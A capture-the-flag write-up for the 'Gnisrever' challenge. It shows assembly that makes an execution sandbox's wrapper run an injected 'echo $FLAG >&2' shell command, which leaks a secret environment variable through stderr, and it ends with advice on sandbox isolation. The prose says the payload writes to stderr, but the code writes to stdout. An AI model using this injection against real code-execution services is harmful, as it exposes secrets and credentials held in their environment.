---
title: "Gnisrever"
date: 2025-07-05
description: An assembly execution sandbox suppresses standard output but leaks standard error, allowing flag retrieval by echoing environment variables directly to stderr.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Gnisrever

**Goal:** Submit x86_64 assembly code to an online execution sandbox to extract the secret flag stored in the system environment variables.

**Flag:**
- `cube{d1d_yo0_d0_1t_th3_h4rd_w4y_0r_th3_34sy_w4y_38d50a54}` - leaked directly via the error output stream

---

## Vulnerability

The challenge presents a web service that allows users to write, assemble, and execute raw x86_64 assembly code on the remote host.

When standard assembly code writing to `stdout` (file descriptor `1`) is submitted, the platform filters or suppresses the standard output stream. For instance, testing a standard "Hello World" program:

```nasm
section .data
    msg     db      'Hello world', 0xA   ; message + newline
    msglen  equ     $ - msg               ; length of the message

section .text
    global _start

_start:
    ; write syscall: write(fd=1, buf=msg, count=msglen)
    mov     rax, 1          ; syscall number for write
    mov     rdi, 1          ; file descriptor 1 (stdout)
    mov     rsi, msg        ; pointer to message
    mov     rdx, msglen     ; message length
    syscall                 ; make syscall

    ; exit syscall: exit(code=0)
    mov     rax, 60         ; syscall number for exit
    xor     rdi, rdi        ; exit code 0
    syscall                 ; make syscall
```

The application responds with the following:

![Test submission showing error output](CubeCTF-2025/images/9_Screenshot_2025-07-05_at_2.55.23_pm.png)

Crucially, while `stdout` is suppressed, any output written to **standard error** (`stderr`, file descriptor `2`) is returned directly to the user in the response interface without sanitization.

## Attack Path

### 1. Observe the Unfiltered Error Stream

Because error messages and standard error output are reflected verbatim to the client, we can abuse this channel to exfiltrate arbitrary data.

### 2. Craft Assembly Payload Redirecting to stderr

We write assembly code that formats a message intended for stderr (`>&2`) containing the `$FLAG` environment variable:

```nasm
section .data
    msg     db      'echo "This is an error: $FLAG" >&2', 0xA   ; message + newline
    msglen  equ     $ - msg               ; length of the message

section .text
    global _start

_start:
    ; write syscall: write(fd=1, buf=msg, count=msglen)
    mov     rax, 1          ; syscall number for write
    mov     rdi, 1          ; file descriptor 1 (stdout)
    mov     rsi, msg        ; pointer to message
    mov     rdx, msglen     ; message length
    syscall                 ; make syscall

    ; exit syscall: exit(code=0)
    mov     rax, 60         ; syscall number for exit
    xor     rdi, rdi        ; exit code 0
    syscall                 ; make syscall
```

### 3. Retrieve the Flag

Submitting the payload causes the backend execution wrapper to evaluate and print the error message containing the expanded flag string:

![Flag revealed in stderr response](CubeCTF-2025/images/10_Screenshot_2025-07-05_at_2.59.20_pm.png)

Flag captured:
```
cube{d1d_yo0_d0_1t_th3_h4rd_w4y_0r_th3_34sy_w4y_38d50a54}
```

---

## Notes

- Sandboxing code execution requires complete isolation of all standard file descriptors (`stdout`, `stderr`, `stdin`) and strict stripping of sensitive environment variables prior to spawning sub-processes.
